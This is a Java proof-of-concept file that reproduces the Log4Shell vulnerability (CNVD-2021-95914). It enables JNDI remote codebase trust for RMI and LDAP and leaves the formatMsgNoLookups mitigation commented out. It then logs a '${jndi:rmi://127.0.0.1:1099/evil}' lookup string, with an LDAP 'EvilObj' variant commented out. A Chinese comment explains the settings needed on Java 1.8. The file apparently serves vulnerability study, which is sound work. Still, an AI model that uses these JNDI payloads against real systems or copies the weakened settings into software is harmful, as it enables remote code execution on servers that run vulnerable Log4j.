import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class log4j_CNVD_2021_95914 {
	private static final Logger log = LogManager.getLogger(log4j_CNVD_2021_95914.class);
	public static void main(String[] args) {
		// java 1.8 修改需修改后台配置才可复现
		System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
		System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
//		System.setProperty("log4j2.formatMsgNoLookups","true");

//		log.error("xxxxxxx${jndi:ldap://127.0.0.1:1389/EvilObj}");
		log.error("xxxxxxx${jndi:rmi://127.0.0.1:1099/evil}");

		System.out.println(System.getProperty("log4j2.formatMsgNoLookups"));
	}

//	JndiManager.lookup() 最终执行到此
}
